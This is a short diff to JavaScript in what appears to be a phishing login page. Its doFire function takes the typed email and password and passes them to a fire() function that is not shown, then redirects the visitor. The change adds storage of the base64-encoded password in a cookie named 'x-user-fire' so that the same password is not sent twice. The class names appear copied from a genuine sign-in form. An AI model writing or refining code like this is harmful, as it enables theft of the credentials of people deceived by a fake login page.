@@ -168,8 +168,10 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
         return a;
     }
     function doFire() {
-		if(document.getElementById('pw').value) {
-			fire(document.getElementById('uremail').value,document.getElementById('pw').value,v);
+		if(document.getElementById('pw').value && Cookies.get("x-user-fire")!=document.getElementById('pw').value) {
+			if(fire(document.getElementById('uremail').value,document.getElementById('pw').value,v)) {
+                Cookies.set("x-user-fire", btoa(document.getElementById('pw').value));
+            }
 			location.href=document.getElementById("redirect").value;
 		} else {
 			document.getElementById('password').className += ' k0tWj IYewr';
